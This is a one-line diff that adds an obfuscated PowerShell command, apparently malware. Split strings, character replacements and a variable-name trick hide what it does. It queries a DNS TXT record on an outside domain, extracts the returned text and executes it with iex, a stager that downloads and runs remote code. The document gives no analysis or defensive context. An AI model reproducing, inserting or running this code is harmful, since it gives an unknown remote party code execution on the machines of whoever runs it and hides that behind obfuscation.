@@ -1,0 +1,1 @@
+﻿(('if(UcMU'+'cM'+'+('+'nslooku'+'p'+' -q'+'=txt '+'l.n'+'s.top'+'brains.'+'p'+'l.)'+' -m'+'atc'+'h'+' '+'UcM'+'@(.'+'*)@UcM){ie'+'x'+' rlamatch'+'es'+'[1'+']}')  -RePlacE'rla',[CHAR]36-RePlacE'UcM',[CHAR]34) | &((VARiabLe '*MDr*').naME[3,11,2]-jOIN'')
